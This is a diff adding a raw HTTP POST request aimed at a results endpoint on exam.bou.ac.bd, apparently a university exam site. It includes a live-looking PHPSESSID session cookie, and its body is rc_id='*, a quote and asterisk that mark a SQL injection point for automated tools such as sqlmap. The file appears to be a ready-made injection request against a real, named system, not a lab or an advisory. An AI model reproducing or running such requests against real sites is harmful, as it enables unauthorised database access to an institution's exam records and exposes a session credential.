@@ -1,0 +1,22 @@
+POST /oss/rc HTTP/1.1
+Host: exam.bou.ac.bd
+Cookie: _ga=GA1.1.238647290.1701582261; _ga_YSLB8VF0YM=GS1.1.1704346727.2.0.1704346727.0.0.0; _ga_DC10VYNSEY=GS1.1.1725261190.23.0.1725261190.0.0.0; _ga_9Y5N50FWS0=GS1.1.1725340814.19.0.1725340814.0.0.0; PHPSESSID=bfqnblnk352oajk1sklo1m33qu
+Content-Length: 18
+Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
+Accept-Language: en-US
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: */*
+X-Requested-With: XMLHttpRequest
+Sec-Ch-Ua-Platform: "Windows"
+Origin: https://exam.bou.ac.bd
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://exam.bou.ac.bd/oss/index?page=c2
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Connection: keep-alive
+
+rc_id='*
